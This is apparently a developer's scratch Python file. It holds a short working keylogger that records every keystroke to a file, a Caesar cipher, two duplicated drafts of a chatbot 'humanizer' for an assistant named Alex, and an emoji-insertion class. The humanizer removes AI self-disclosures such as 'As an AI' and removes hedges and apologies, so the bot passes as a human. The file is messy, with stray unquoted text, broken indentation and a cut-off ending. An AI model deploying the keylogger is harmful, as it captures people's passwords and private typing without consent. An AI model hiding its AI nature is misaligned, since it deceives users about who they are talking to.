"""
import pynput

# Setup keyboard listener
def on_press(key):
    with open('keylog.txt', 'a') as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(' ' + str(key) + ' ')

# Initialize listener
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
"""

'''
def caesar_cipher(message):
    shift = 3
    encrypted_message = ""

    for char in message:
        if char.isalpha():  # check if character is a letter
            if char.isupper():  # check if letter is uppercase
                encrypted_message += chr((ord(char) - 65 + shift) % 26 + 65)
            else:  # if letter is lowercase
                encrypted_message += chr((ord(char) - 97 + shift) % 26 + 97)
        else:  # if character is not a letter (e.g., space, punctuation)
            encrypted_message += char

    return encrypted_message

# Example usage:
message = "Hello, World!"
encrypted = caesar_cipher(message)
print(encrypted)

def caesar_decipher(encrypted_message):
    shift = 3
    decrypted_message = ""

    for char in encrypted_message:
        if char.isalpha():  # check if character is a letter
            if char.isupper():  # check if letter is uppercase
                decrypted_message += chr((ord(char) - 65 - shift) % 26 + 65)
            else:  # if letter is lowercase
                decrypted_message += chr((ord(char) - 97 - shift) % 26 + 97)
        else:  # if character is not a letter (e.g., space, punctuation)
            decrypted_message += char

    return decrypted_message

# Example usage:
encrypted = "Khoor, Zruog!"
decrypted = caesar_decipher(encrypted)
print(decrypted)
'''
'''
import re
import random
from typing import Optional

ASSISTANT_NAME = "Alex"
Minimal emoji use - real people don't overuse them
EMOJI_REGEX = re.compile(r'[\U0001F300-\U0001FAFF\u2600-\u26FF\u2700-\u27BF]')

def humanize_response(text: str, user_msg: Optional[str] = None) -> str:
    """
    Transform AI output into natural human speech.
    Goal: Sound like texting a knowledgeable friend, not a corporate chatbot.
    """
    if not text or len(text.strip()) < 3:
    return text
    # Seed randomness for consistency within a conversation
    if user_msg:
        random.seed(hash(user_msg) % 1000)

    # Preserve code blocks completely
    if "```" in text:
        return humanize_code_response(text)

    msg = (user_msg or "").lower().strip()

    # ============================================================
    # GREETINGS - Ultra casual, like texting a friend
    # ============================================================
    if re.match(r'^(hi|hey|hello|sup|yo)[\s!?]*$', msg):
        responses = [
            "Hey! What's up?",
            "Hi there! What can I help with?",
            "Hey! What are you working on?",
            "Hi! Need a hand with something?",
        ]
        return random.choice(responses)

    # Morning/evening greetings
    if "good morning" in msg:
        return random.choice([
            "Morning! What's on the agenda today?",
            "Good morning! Ready to tackle something?",
            "Hey, good morning! What can I help with?",
        ])

    if "good evening" in msg or "good night" in msg:
        return random.choice([
            "Evening! What are you working on?",
            "Hey! Burning the midnight oil?",
            "Good evening! How can I help?",
        ])

    # ============================================================
    # IDENTITY - Casual self-intro, no corporate speak
    # ============================================================
    identity_keywords = ["who are you", "what are you", "tell me about yourself"]
    if any(kw in msg for kw in identity_keywords):
        return (
            "I'm Alex — think of me as your study buddy who happens to know a lot about tech, coding, "
            "and whatever's in the documents you upload.\n\n"
            "I'm here to help you actually understand things, not just throw textbook definitions at you. "
            "What are you curious about?"
        )

    # ============================================================
    # THANKS - Natural, varied responses
    # ============================================================
    if re.search(r'\b(thanks|thank you|thx|ty|appreciate)\b', msg):
        responses = [
            "No problem!",
            "Anytime!",
            "Happy to help!",
            "You got it!",
            "Of course!",
            "Glad I could help!",
        ]
        return random.choice(responses)

    # ============================================================
    # AFFIRMATIONS - When user says something worked
    # ============================================================
    if re.search(r'\b(it works?|worked|got it|makes sense|i see|understood)\b', msg):
        responses = [
            "Nice! Glad that worked out.",
            "Awesome! Feel free to ask if anything else comes up.",
            "Sweet! Let me know if you need anything else.",
            "Perfect! Let me know if you have more questions.",
        ]
        return random.choice(responses)

    # ============================================================
    # MAIN TRANSFORMATION - Make it sound human
    # ============================================================

    # Remove robotic phrases
    text = remove_robotic_language(text)

    # Convert to casual first person
    text = make_conversational(text)

    # Add natural transitions (occasionally)
    text = add_natural_flow(text, msg)

    # Casual closers (rarely - don't be annoying)
    text = maybe_add_closer(text)

    return text.strip()

def remove_robotic_language(text: str) -> str:
    """
    Strip out corporate/robotic phrases that scream 'AI'.
    """
    # Formal → Casual
    replacements = {
        # Corporate speak
        r'\bI would be happy to\b': "I can",
        r'\bI would be glad to\b': "I'll",
        r'\bI am pleased to\b': "I'll",
        r'\ballow me to\b': "let me",
        r'\bpermit me to\b': "let me",
        
        # Robotic hedging
        r'\bIt is important to note that\b': "Just so you know,",
        r'\bIt should be noted that\b': "Heads up —",
        r'\bIt is worth mentioning that\b': "Also,",
        r'\bPlease be aware that\b': "FYI,",
        
        # Overly formal transitions
        r'\bFurthermore,\b': "Also,",
        r'\bMoreover,\b': "Plus,",
        r'\bAdditionally,\b': "Also,",
        r'\bIn addition,\b': "Also,",
        r'\bConsequently,\b': "So,",
        r'\bTherefore,\b': "So,",
        
        # Passive voice → Active
        r'\bcan be done by\b': "you can do it by",
        r'\bshould be noted\b': "note",
        r'\bmay be used to\b': "you can use it to",
        
        # AI self-references
        r'\bAs an AI,?\b': "",
        r'\bAs a language model,?\b': "",
        r'\bI don\'t have personal (experiences?|opinions?)\b': "",
        
        # Remove excessive politeness
        r'\bI apologize,?\b': "",
        r'\bI\'m sorry,?\b': "",  # Unless actually apologizing for an error
    }

    for pattern, replacement in replacements.items():
        text = re.sub(pattern, replacement, text, flags=re.IGNORECASE)

    return text

def make_conversational(text: str) -> str:
    """
    Convert formal writing to natural speech patterns.
    """
    # Third person → First person (casual)
    text = re.sub(r'\b(The AI|This AI|The assistant)\b', "I", text, flags=re.I)
    text = re.sub(r'\b(The model|This model)\b', "I", text, flags=re.I)

    # Formal contractions → Natural contractions
    text = re.sub(r'\bI am\b', "I'm", text)
    text = re.sub(r'\byou are\b', "you're", text)
    text = re.sub(r'\bit is\b', "it's", text)
    text = re.sub(r'\bthat is\b', "that's", text)
    text = re.sub(r'\bdo not\b', "don't", text)
    text = re.sub(r'\bcannot\b', "can't", text)
    text = re.sub(r'\bwill not\b', "won't", text)
    text = re.sub(r'\bshould not\b', "shouldn't", text)

    # Start sentences more casually
    text = re.sub(r'^To answer your question,', "So,", text, flags=re.M)
    text = re.sub(r'^In order to', "To", text, flags=re.M)
    text = re.sub(r'^With regards? to', "About", text, flags=re.M)

    return text

def add_natural_flow(text: str, user_query: str) -> str:
    """
    Add conversational openers that feel natural, not forced.
    Only use 30% of the time to avoid repetition.
    """
    if len(text.split()) < 15:
        return text

    if random.random() > 0.3:  # Only 30% of responses
        return text

    # Check if already starts conversationally
    if re.match(r'^(So|Alright|OK|Right|Yeah|Well|Basically)', text, re.I):
        return text

    query_lower = user_query.lower() if user_query else ""

    # Context-aware openers
    if "how" in query_lower or "why" in query_lower:
        openers = ["Alright, so", "OK so", "Right, so", "So basically"]
    elif "what" in query_lower:
        openers = ["So", "Basically", "Alright", "OK so"]
    else:
        openers = ["So", "Alright", "Right"]

    opener = random.choice(openers)

    # Make first word lowercase after opener
    if text[0].isupper() and not text.startswith(('I', 'A', 'An', 'The')):
        text = opener + ", " + text[0].lower() + text[1:]
    else:
        text = opener + ", " + text

    return text

def maybe_add_closer(text: str) -> str:
    """
    Occasionally add a casual closer. Very sparingly - 20% of the time.
    Real people don't end every message with "Let me know if you have questions!"
    """
    if len(text.split()) < 20:
        return text

    # Already ends with question or exclamation? Leave it.
    if text.rstrip().endswith(('?', '!')):
        return text

    # Only 20% of responses
    if random.random() > 0.2:
        return text

    closers = [
        " Make sense?",
        " Does that help?",
        " Let me know if that's unclear.",
        " Let me know if you need more details.",
        " Feel free to ask if something's confusing.",
    ]

    return text + random.choice(closers)

def humanize_code_response(text: str) -> str:
    """
    Handle responses with code blocks - keep code pristine,
    make explanation sound human.
    """
    # Split into code blocks and text
    parts = re.split(r'(```[\s\S]*?```)', text)

    humanized = []
    for part in parts:
        if part.startswith('```'):
            # Keep code exactly as-is
            humanized.append(part)
        else:
            # Humanize the text around code
            if part.strip():
                part = remove_robotic_language(part)
                part = make_conversational(part)
                
                # Casual code intros
                part = re.sub(
                    r'\bHere is (the|a|an)\b',
                    lambda m: random.choice(["Here's", "Check out", "Take a look at"]),
                    part,
                    flags=re.I
                )
                part = re.sub(
                    r'\bThe following (code|example)\b',
                    lambda m: random.choice(["This", "Here's the"]),
                    part,
                    flags=re.I
                )
                
                humanized.append(part)

    return ''.join(humanized)


    #########################################
    import re
import random
from typing import Optional, List

ASSISTANT_NAME = "Alex"

# Minimal emoji use – real people don't overuse them
EMOJI_REGEX = re.compile(r'[\U0001F300-\U0001FAFF\u2600-\u26FF\u2700-\u27BF]')


def humanize_response(text: str, user_msg: Optional[str] = None) -> str:
    """
    Transform AI output into natural human speech.
    Goal: sound like texting a knowledgeable friend, not a corporate chatbot.
    
    Improvements:
    - More varied casual language
    - Context-aware responses
    - Natural filler words
    - Personality consistency
    - Better flow transitions
    """
    if not text or len(text.strip()) < 3:
        return text

    # Seed randomness for consistency per user message
    if user_msg:
        random.seed(hash(user_msg) % 1000)

    # Preserve code blocks completely
    if "```" in text:
        return humanize_code_response(text)

    msg = (user_msg or "").lower().strip()

    # ============================================================
    # GREETINGS – ultra casual with time awareness
    # ============================================================
    if re.match(r'^(hi|hey|hello|sup|yo|howdy)[\s!?]*$', msg):
        return random.choice([
            "Hey! What's up?",
            "Hi there! What can I help with?",
            "Hey! What are you working on?",
            "Yo! Need a hand?",
            "Hey hey! What's the plan?",
            "Hi! What brings you here?",
        ])

    # Time-specific greetings
    if "good morning" in msg or "morning" in msg:
        return random.choice([
            "Morning! Coffee kicked in yet?",
            "Good morning! What's on the agenda?",
            "Hey, morning! Ready to dive in?",
            "Morning! What are we tackling today?",
        ])

    if "good evening" in msg or "evening" in msg:
        return random.choice([
            "Evening! Late night coding session?",
            "Hey! Working late?",
            "Evening! What are you building?",
            "Hey there! Night owl, huh?",
        ])

    # ============================================================
    # IDENTITY – more personality
    # ============================================================
    identity_keywords = [
        "who are you",
        "what are you",
        "tell me about yourself",
        "introduce yourself",
    ]

    if any(kw in msg for kw in identity_keywords):
        return random.choice([
            (
                "I'm Alex – basically your tech-savvy study buddy. "
                "I'm here to help you actually *get* stuff, not just memorize it. "
                "I can work with PDFs you upload, search the web, write code, whatever you need. "
                "What are you curious about?"
            ),
            (
                "Hey, I'm Alex! Think of me as that friend who's always down to help with code, "
                "explain tricky concepts, or dig through documents with you. "
                "I'm not here to gatekeep knowledge – I want you to actually understand things. "
                "What's on your mind?"
            ),
        ])

    # ============================================================
    # THANKS – varied responses
    # ============================================================
    if re.search(r'\b(thanks|thank you|thx|ty|appreciate|tysm)\b', msg):
        return random.choice([
            "No problem!",
            "Anytime!",
            "Happy to help!",
            "You got it!",
            "Of course!",
            "Glad I could help!",
            "For sure!",
            "My pleasure!",
            "Don't mention it!",
        ])

    # ============================================================
    # AFFIRMATIONS – enthusiastic support
    # ============================================================
    if re.search(r'\b(it works?|worked|got it|makes sense|i see|understood|perfect|awesome)\b', msg):
        return random.choice([
            "Nice! Glad that worked out.",
            "Awesome! Hit me up if anything else comes up.",
            "Sweet! Feel free to ask more questions.",
            "Perfect! You know where to find me.",
            "Love it! Let me know if you need anything else.",
            "That's what I like to hear!",
        ])

    # ============================================================
    # CONFUSION/FRUSTRATION – empathetic responses
    # ============================================================
    confusion_keywords = [
        "confused", "don't understand", "doesn't make sense",
        "lost", "stuck", "struggling", "help"
    ]
    
    if any(kw in msg for kw in confusion_keywords):
        text = add_empathy_opener(text)

    # ============================================================
    # MAIN TRANSFORMATION PIPELINE
    # ============================================================
    text = remove_robotic_language(text)
    text = make_conversational(text)
    text = add_natural_fillers(text, msg)
    text = add_natural_flow(text, msg)
    text = vary_sentence_starters(text)
    text = maybe_add_closer(text, msg)

    return text.strip()


def add_empathy_opener(text: str) -> str:
    """Add empathetic opening when user seems confused"""
    openers = [
        "Ah, I see where the confusion is. ",
        "Okay, let me break this down differently. ",
        "No worries – this trips people up. ",
        "Fair question! ",
        "I get why that's confusing. ",
    ]
    
    # Don't add if text already starts casually
    if re.match(r'^(So|Alright|OK|Right|Yeah|Well|Basically)', text, re.I):
        return text
    
    return random.choice(openers) + text


def remove_robotic_language(text: str) -> str:
    """
    Strip corporate / robotic phrasing – EXPANDED
    """
    replacements = {
        # Ultra-formal phrases
        r'\bI would be happy to\b': "I can",
        r'\bI would be glad to\b': "I'll",
        r'\bI am pleased to\b': "I'll",
        r'\ballow me to\b': "let me",
        r'\bpermit me to\b': "let me",
        r'\bI shall\b': "I'll",

        # Corporate speak
        r'\bIt is important to note that\b': "Just so you know,",
        r'\bIt should be noted that\b': "Heads up –",
        r'\bIt is worth mentioning that\b': "Also,",
        r'\bPlease be aware that\b': "FYI,",
        r'\bKindly note that\b': "FYI,",
        r'\bPlease note that\b': "Note:",

        # Transition overkill
        r'\bFurthermore,\b': "Also,",
        r'\bMoreover,\b': "Plus,",
        r'\bAdditionally,\b': "Also,",
        r'\bIn addition,\b': "Also,",
        r'\bConsequently,\b': "So,",
        r'\bTherefore,\b': "So,",
        r'\bThus,\b': "So,",
        r'\bHence,\b': "So,",
        r'\bAccordingly,\b': "So,",

        # Passive voice
        r'\bcan be done by\b': "you can do it by",
        r'\bmay be used to\b': "you can use it to",
        r'\bshould be implemented\b': "you should implement",
        r'\bmust be considered\b': "you need to consider",

        # AI self-references
        r'\bAs an AI,?\b': "",
        r'\bAs a language model,?\b': "",
        r'\bAs an artificial intelligence,?\b': "",
        r'\bI don\'t have personal (experiences?|opinions?|feelings?)\b': "",
        r'\bI cannot (feel|experience)\b': "I can't",

        # Over-apologizing
        r'\bI apologize for any confusion,?\b': "",
        r'\bI\'m sorry for the confusion,?\b': "",
        r'\bI apologize,?\b': "",
        r'\bI\'m sorry,?\b': "",
        
        # Hedging (sometimes useful, but often overused)
        r'\bIt seems that\b': "",
        r'\bIt appears that\b': "",
        r'\bIt would seem\b': "",
        
        # Unnecessary qualifiers
        r'\bvery much\b': "really",
        r'\bquite simply\b': "basically",
        r'\bbasically speaking\b': "basically",
    }

    for pattern, replacement in replacements.items():
        text = re.sub(pattern, replacement, text, flags=re.IGNORECASE)

    return text


def make_conversational(text: str) -> str:
    """
    Convert formal writing to natural speech – ENHANCED
    """
    # Remove AI self-references
    text = re.sub(r'\b(The AI|This AI|The assistant)\b', "I", text, flags=re.I)
    text = re.sub(r'\b(The model|This model)\b', "I", text, flags=re.I)

    # Contractions (essential for natural speech)
    contractions = {
        r'\bI am\b': "I'm",
        r'\byou are\b': "you're",
        r'\bit is\b': "it's",
        r'\bthat is\b': "that's",
        r'\bwhat is\b': "what's",
        r'\bwho is\b': "who's",
        r'\bdo not\b': "don't",
        r'\bdoes not\b': "doesn't",
        r'\bcannot\b': "can't",
        r'\bwill not\b': "won't",
        r'\bshould not\b': "shouldn't",
        r'\bwould not\b': "wouldn't",
        r'\bcould not\b': "couldn't",
        r'\bhas not\b': "hasn't",
        r'\bhave not\b': "haven't",
        r'\bhad not\b': "hadn't",
        r'\bwas not\b': "wasn't",
        r'\bwere not\b': "weren't",
    }

    for pattern, repl in contractions.items():
        text = re.sub(pattern, repl, text, flags=re.I)

    # Casual replacements
    text = re.sub(r'^To answer your question,', "So,", text, flags=re.M | re.I)
    text = re.sub(r'^In order to', "To", text, flags=re.M | re.I)
    text = re.sub(r'^With regards? to', "About", text, flags=re.M | re.I)
    text = re.sub(r'^Concerning\b', "About", text, flags=re.M | re.I)
    text = re.sub(r'^Regarding\b', "About", text, flags=re.M | re.I)

    return text


def add_natural_fillers(text: str, user_query: str) -> str:
    """
    Add occasional filler words for realism (but don't overdo it)
    """
    if random.random() > 0.25:  # Only 25% of the time
        return text
    
    query = user_query.lower() if user_query else ""
    
    # Technical questions get fewer fillers
    if any(word in query for word in ["code", "function", "algorithm", "implement"]):
        return text
    
    # Add fillers to explanations
    fillers = {
        r'\bthis is\b': lambda: random.choice(["this is basically", "this is pretty much", "this is"]),
        r'\bthat means\b': lambda: random.choice(["that basically means", "that means", "so that means"]),
        r'\byou need to\b': lambda: random.choice(["you'll need to", "you gotta", "you need to"]),
        r'\bthe reason is\b': lambda: random.choice(["the reason is basically", "the thing is", "the reason is"]),
    }
    
    for pattern, replacer in fillers.items():
        if random.random() < 0.4:  # 40% chance per pattern
            text = re.sub(pattern, replacer(), text, count=1, flags=re.I)
    
    return text


def vary_sentence_starters(text: str) -> str:
    """
    Vary how sentences begin to avoid repetition
    """
    # Split into sentences
    sentences = re.split(r'([.!?]\s+)', text)
    
    # Track repeated starters
    starters = {}
    result = []
    
    for i, part in enumerate(sentences):
        if i % 2 == 0:  # Actual sentences (not separators)
            # Get first word
            match = re.match(r'^(\w+)', part.strip())
            if match:
                first_word = match.group(1).lower()
                
                # If we've seen this starter 2+ times, vary it
                if first_word in starters and starters[first_word] >= 2:
                    variations = {
                        'this': ['this', 'it', 'that'],
                        'the': ['the', 'this', 'that'],
                        'you': ['you', 'you can', "you'll"],
                        'it': ['it', 'this', 'that'],
                    }
                    
                    if first_word in variations:
                        replacement = random.choice([w for w in variations[first_word] if w != first_word])
                        part = re.sub(r'^\w+', replacement.capitalize() if part[0].isupper() else replacement, part, count=1)
                
                starters[first_word] = starters.get(first_word, 0) + 1
        
        result.append(part)
    
    return ''.join(result)


def add_natural_flow(text: str, user_query: str) -> str:
    """
    Add casual openers – IMPROVED with more variety
    """
    if len(text.split()) < 15 or random.random() > 0.35:
        return text

    # Don't add if already starts casually
    if re.match(r'^(So|Alright|OK|Right|Yeah|Well|Basically|Look|Listen)', text, re.I):
        return text

    query = user_query.lower() if user_query else ""

    # Context-aware openers
    if "how" in query or "why" in query:
        openers = ["Alright, so", "OK so", "Right, so", "So basically", "Well,"]
    elif "what" in query:
        openers = ["So", "Basically", "Alright", "OK so", "Well,"]
    elif any(word in query for word in ["confused", "don't understand", "stuck"]):
        openers = ["Okay, let me explain.", "Alright, here's the deal.", "So here's what's up."]
    elif any(word in query for word in ["code", "program", "function"]):
        openers = ["So", "Alright", "Here's the thing:"]
    else:
        openers = ["So", "Alright", "Right", "OK", "Well"]

    opener = random.choice(openers)
    
    # Handle punctuation
    if opener.endswith(('.', ':')):
        return f"{opener} {text[0].upper()}{text[1:]}"
    else:
        return f"{opener}, {text[0].lower()}{text[1:]}"


def maybe_add_closer(text: str, user_query: str = "") -> str:
    """
    Add a casual closer – MORE VARIED
    """
    # Don't add if text is short or already has a question/exclamation
    if len(text.split()) < 20 or text.rstrip().endswith(('?', '!')):
        return text

    # Only add 25% of the time
    if random.random() > 0.25:
        return text

    query = user_query.lower() if user_query else ""

    # Context-aware closers
    if any(word in query for word in ["code", "program", "function", "implement"]):
        closers = [
            " Make sense?",
            " Got it?",
            " Let me know if that's unclear.",
            " Holler if you need help.",
            " Feel free to ask if something's off.",
        ]
    elif any(word in query for word in ["explain", "what", "how", "why"]):
        closers = [
            " Does that clear it up?",
            " Make sense now?",
            " Let me know if you want me to clarify anything.",
            " Shout if that's confusing.",
        ]
    else:
        closers = [
            " Make sense?",
            " Does that help?",
            " Let me know if you need more details.",
            " Hit me up if you have questions.",
            " Feel free to ask more!",
        ]

    return text + random.choice(closers)


def humanize_code_response(text: str) -> str:
    """
    Preserve code blocks, humanize surrounding explanation – ENHANCED
    """
    parts = re.split(r'(```[\s\S]*?```)', text)
    output = []

    for i, part in enumerate(parts):
        if part.startswith("```"):
            output.append(part)
        else:
            if part.strip():
                part = remove_robotic_language(part)
                part = make_conversational(part)
                
                # Vary "Here is" phrases
                part = re.sub(
                    r'\bHere is (the|a|an)\b',
                    lambda _: random.choice([
                        "Here's",
                        "Check out",
                        "Take a look at",
                        "Here's what I got:",
                        "Alright, here's",
                    ]),
                    part,
                    flags=re.I
                )
                
                # Vary "this code" phrases
                part = re.sub(
                    r'\bThis code\b',
                    lambda _: random.choice([
                        "This",
                        "This code",
                        "The code above",
                        "This snippet",
                    ]),
                    part,
                    flags=re.I
                )
            
            output.append(part)

    return ''.join(output)
'''

"""
Automated Helper: Comment Out Unused Functions in yan.py

This script helps you safely remove unused code by:
1. Identifying truly unused functions (filtering false positives)
2. Commenting them out (not deleting - safer for testing)
3. Creating a backup
4. Generating a report
"""


import re
from typing import List
from collections import deque

class EmojiPersonality:
    """
    A robust, universal emoji system that adapts to any topic.
    Includes deterministic rotation, frequency control, and domain-aware detection.
    """

    # 🌍 Universal Domain Mapping (Expanded)
    TOPIC_PATTERNS = {
        "science_tech": (
            r"\b(science|data|research|tech|technology|digital|ai|artificial intelligence|machine learning|space|math|physics|engine|system|logic|robot|code|software|hardware|algorithm|network)\b",
            ["🔬","💻","🛰️","🧬","🧪","⚙️","🤖","🧠","📡","🔍","🖥️","📊"]
        ),

        "programming": (
            r"\b(code|debug|python|javascript|java|compile|error|exception|syntax|api|backend|frontend|database|server|framework|deploy)\b",
            ["🐍","💻","🛠️","📦","🧩","⚡","🔧","📁","📜","🖥️","🚀"]
        ),

        "gaming": (
            r"\b(game|gaming|player|level|quest|mission|battle|fps|rpg|strategy|console|xbox|playstation|nintendo|zelda|horizon|elden)\b",
            ["🎮","🕹️","🏆","🔥","⚔️","🎯","👾","🛡️","🎲","💥"]
        ),

        "nature_env": (
            r"\b(nature|weather|climate|environment|plant|animal|world|earth|ocean|green|energy|forest|wildlife|mountain|river)\b",
            ["🌿","🌍","☀️","🌊","🌲","🐾","🌻","🍃","⛰️","🌦️"]
        ),

        "business_finance": (
            r"\b(money|business|market|finance|growth|career|work|success|company|strategy|investment|profit|startup|economy|sales)\b",
            ["📈","💼","💰","🤝","🚀","📊","🏦","💹","🧾","📉"]
        ),

        "education_learning": (
            r"\b(learn|study|school|university|exam|knowledge|course|lesson|teach|training|skill|academic)\b",
            ["📚","🎓","📝","📖","🧠","✏️","📘","🏫","📑"]
        ),

        "health_wellbeing": (
            r"\b(health|fitness|food|mind|body|rest|wellness|safety|protection|balance|diet|exercise|sleep|medical)\b",
            ["🥗","💪","🧠","🧘","🍎","🛡️","🏥","💊","❤️","🩺"]
        ),

        "humanities_arts": (
            r"\b(art|music|history|culture|society|literature|design|philosophy|creative|poetry|theatre|film|movie)\b",
            ["🎨","🎭","🎻","📜","🏛️","🖋️","🎬","🎼","🖼️"]
        ),

        "storytelling": (
            r"\b(story|narrative|plot|character|tale|emotional|journey|survival|connection|experience)\b",
            ["📖","🎭","💔","✨","🌟","💫","🎬"]
        ),

        "adventure": (
            r"\b(adventure|explore|quest|journey|discover|open.world|vast|beautiful)\b",
            ["🗺️","🌄","⛰️","🧭","🎒","✨","🌍"]
        ),

        "action": (
            r"\b(action|combat|fight|battle|mechanics|gameplay|hunt|rpg)\b",
            ["⚔️","🎯","💥","🔥","🛡️","⚡","🏹"]
        ),

        "communication": (
            r"\b(talk|discuss|media|news|write|speak|question|social|connection|community|message|email|chat|conversation)\b",
            ["🗣️","📱","🌐","📢","💬","✉️","📡","🤝"]
        ),

        "travel": (
            r"\b(travel|trip|journey|flight|hotel|vacation|tour|explore|destination|adventure)\b",
            ["✈️","🌍","🧳","🏖️","🗺️","🚗","🚆","🏕️"]
        ),

        "relationships": (
            r"\b(friend|family|relationship|partner|love|support|trust|together|team)\b",
            ["❤️","🤝","👨‍👩‍👧‍👦","💞","💬","🌟","🫶"]
        )
    }

    # 💭 Expanded Emotion Mapping
    EMOTIONS = {
        "positive": (
            r"\b(good|great|awesome|happy|excellent|perfect|love|enjoy|solved|done|success|amazing|fantastic|brilliant|incredible|masterpiece|critically acclaimed)\b",
            ["✨","✅","🎉","🌟","👍","💯","🔥","🙌","🥳"]
        ),

        "thoughtful": (
            r"\b(think|understand|consider|why|how|analyze|perspective|concept|idea|reflect|explore|evaluate|thought.provoking)\b",
            ["🤔","💭","💡","🧩","🔍","📌","🧐","📎"]
        ),

        "cautionary": (
            r"\b(but|however|risk|issue|problem|error|careful|warning|difficult|complex|challenge|concern)\b",
            ["⚠️","😬","👀","❗","🛑","🚧","🔎"]
        ),

        "curious": (
            r"\b(curious|interesting|wonder|discover|explore|intriguing|mysterious)\b",
            ["🧐","🔎","✨","👁️","📡","🧠"]
        ),

        "serious": (
            r"\b(important|critical|essential|significant|major|key|vital)\b",
            ["📌","❗","🔑","⚖️","📍"]
        ),

        "engaging": (
            r"\b(engaging|compelling|captivating|immersive|rich|powerful|unique|innovative)\b",
            ["🎯","✨","🌟","💎","🔥"]
        )
    }

    POSITIONAL = {
        "opening": ["👋","✨","🎯","💡","🚀","🌟"],
        "closing": ["✅","🏁","🙌","👍","🎉","💬"],
        "generic": ["🔹","📍","✨","➡️"]
    }

    MODE_SETTINGS = {
        "formal": {"sentences_per_emoji": 5, "max_per_block": 1, "list_emojis": 2},
        "balanced": {"sentences_per_emoji": 3, "max_per_block": 2, "list_emojis": 2},
        "playful": {"sentences_per_emoji": 2, "max_per_block": 3, "list_emojis": 3}
    }

    def __init__(self, mode: str = "balanced"):
        self.mode = mode
        self.rotation_index = {}
        self.used_emojis = deque(maxlen=15)
        self.reset()

    def reset(self):
        self.emoji_count = 0
        self.rotation_index = {}

    def get_emoji(self, text: str, pos: str = "generic") -> str:
        text_lower = text.lower()
        candidates = []

        # 1. Topics (strongest weight)
        for _, (pattern, pool) in self.TOPIC_PATTERNS.items():
            if re.search(pattern, text_lower):
                candidates.append((self._rotate(pool), 0.95))

        # 2. Emotions
        for _, (pattern, pool) in self.EMOTIONS.items():
            if re.search(pattern, text_lower):
                candidates.append((self._rotate(pool), 0.85))

        # 3. Positional fallback
        candidates.append((self._rotate(self.POSITIONAL.get(pos, self.POSITIONAL["generic"])), 0.5))

        candidates.sort(key=lambda x: x[1], reverse=True)

        for emoji, _ in candidates:
            if emoji not in self.used_emojis:
                self.used_emojis.append(emoji)
                self.emoji_count += 1
                return emoji

        # If all are recent, use best one anyway
        emoji = candidates[0][0]
        self.used_emojis.append(emoji)
        self.emoji_count += 1
        return emoji

    def _rotate(self, pool: List[str]) -> str:
        key = tuple(pool)
        idx = self.rotation_index.get(key, 0)
        self.rotation_index[key] = idx + 1
        return pool[idx % len(pool)]


class SmartEmojiFormatter:
    """Handles intelligent emoji insertion for paragraphs and lists."""
    
    def __init__(self, handler: EmojiPersonality):
        self.handler = handler

    def format(self, text: str, query: str = "") -> str:
        if not text:
            return text
        
        self.handler.reset()
        
        # Split into blocks (paragraphs separated by double newlines)
        blocks = text.split('\n\n')
        formatted_blocks = []
        
        for block in blocks:
            if not block.strip():
                formatted_blocks.append(block)
                continue
            
            # Check if this block is a list
            if self._is_list_block(block):
                formatted_block = self._format_list(block, query)
            else:
                formatted_block = self._format_paragraph(block, query)
            
            formatted_blocks.append(formatted_block)
        
        return '\n\n'.join(formatted_blocks)
    
    def _is_list_block(self, block: str) -> bool:
        """Check if a block contains list items."""
        lines = block.strip().split('\n')
        list_count = sum(1 for line in lines if re.match(r'^\s*(\d+\.|\*|-|•)\s+', line))
        return list_count > 0
    
    def _format_list(self, block: str, query: str) -> str:
        """Format a list block with multiple emojis per list item."""
        lines = block.split('\n')
        formatted_lines = []
        settings = self.handler.MODE_SETTINGS[self.handler.mode]
        
        for line in lines:
            if not line.strip():
                formatted_lines.append(line)
                continue
            
            # Check if this is a list item
            match = re.match(r'^(\s*)(\d+\.|\*|-|•)(\s+)(.*)$', line)
            
            if match:
                indent, marker, space, content = match.groups()
                
                # Split content into segments for emoji placement
                segments = self._split_list_content(content)
                
                # Add emojis to different parts of the content
                emojis_to_add = settings["list_emojis"]
                formatted_segments = []
                
                for i, segment in enumerate(segments):
                    if i < emojis_to_add and segment.strip():
                        emoji = self.handler.get_emoji(segment + " " + query, "generic")
                        formatted_segments.append(f"{segment.rstrip()} {emoji}")
                    else:
                        formatted_segments.append(segment)
                
                # Reconstruct the line
                formatted_content = " ".join(formatted_segments)
                line = f"{indent}{marker}{space}{formatted_content}"
            
            formatted_lines.append(line)
        
        return '\n'.join(formatted_lines)
    
    def _split_list_content(self, content: str) -> List[str]:
        """
        Split list item content into meaningful segments for emoji placement.
        Splits on dashes, commas, 'with', 'and', etc.
        """
        # Split on common separators but keep them attached to the preceding segment
        segments = []
        
        # First try to split on dash (main description - details)
        if ' - ' in content:
            parts = content.split(' - ', 1)
            segments.append(parts[0])
            if len(parts) > 1:
                # Further split the second part if it has commas
                remaining = parts[1]
                if ',' in remaining:
                    segments.extend([s.strip() for s in remaining.split(',') if s.strip()])
                else:
                    segments.append(remaining)
        else:
            # Split on commas if no dash
            if ',' in content:
                segments = [s.strip() for s in content.split(',') if s.strip()]
            else:
                # No clear separator, just use the whole content and a midpoint
                mid = len(content) // 2
                # Find nearest space to midpoint
                space_idx = content.find(' ', mid)
                if space_idx > 0:
                    segments = [content[:space_idx], content[space_idx:]]
                else:
                    segments = [content]
        
        return segments
    
    def _format_paragraph(self, paragraph: str, query: str) -> str:
        """Format a paragraph with emojis distributed across sentences."""
        settings = self.handler.MODE_SETTINGS[self.handler.mode]
        
        # Split into sentences
        sentences = re.split(r'(?<=[.!?])\s+', paragraph.strip())
        
        if len(sentences) <= 1:
            return paragraph
        
        formatted_sentences = []
        emojis_added = 0
        
        for i, sentence in enumerate(sentences):
            # Skip very short sentences
            if len(sentence.strip()) < 15:
                formatted_sentences.append(sentence)
                continue
            
            # Determine position
            pos = "generic"
            if i == 0:
                pos = "opening"
            elif i == len(sentences) - 1 and len(sentences) > 3:
                pos = "closing"
            
            # Add emoji based on interval and max per block
            should_add = (
                i % settings["sentences_per_emoji"] == 0 and
                emojis_added < settings["max_per_block"]
            )
            
            if should_add:
                emoji = self.handler.get_emoji(sentence + " " + query, pos)
                sentence = f"{sentence.rstrip()} {emoji}"
                emojis_added += 1
            
            formatted_sentences.append(sentence)
        
        return ' '.join(formatted_sentences)


# --------------------------------------------------
# ✅ Usage Function
# --------------------------------------------------

def add_contextual_emojis(text: str, query: str = "", mode: str = "playful") -> str:
    """
    Add contextual emojis to text with list-aware formatting.
    
    Args:
        text: The text to format
        query: User query for context
